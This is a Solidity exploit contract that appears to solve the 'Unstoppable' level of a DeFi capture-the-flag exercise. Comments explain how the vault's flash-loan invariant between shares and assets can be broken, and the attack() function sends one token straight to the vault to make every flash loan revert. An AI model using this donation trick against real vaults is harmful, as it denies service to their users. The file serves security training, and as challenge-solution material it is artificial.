// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {UnstoppableVault} from "../src/Unstoppable.sol";
import {ReceiverUnstoppable} from "../src/ReceiverUnstoppable.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract UnstoppableExploiter is ReceiverUnstoppable {
    UnstoppableVault pool;
    IERC20 token;

    constructor(address _pool, address _token) ReceiverUnstoppable(_pool) {
        pool = UnstoppableVault(_pool);
        token = IERC20(_token);
    }

    // observations:
    // we just need to DoS the target
    //
    // plan:
    // We need to make sure flashLoan always reverts.
    // Thus we need to break one of the invariants.
    // The only invariant we can realistically break is the following:
    //    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
    // totalAssets() is the balance of the vault for the underlying token
    // totalSupply is the amount of shares minted
    // The invariant could also be written like this:
    // totalSupply * totalSupply / balanceOf(asset) == balanceOf(asset)
    // totalSupply * totalSupply == balanceOf(asset) * balanceOf(asset)
    // This only holds when there is 1 asset for every share and vice-versa
    // We can break this by donating assets
    function attack() public {
        token.transfer(address(pool), 1);
    }

    receive() external payable {}
}
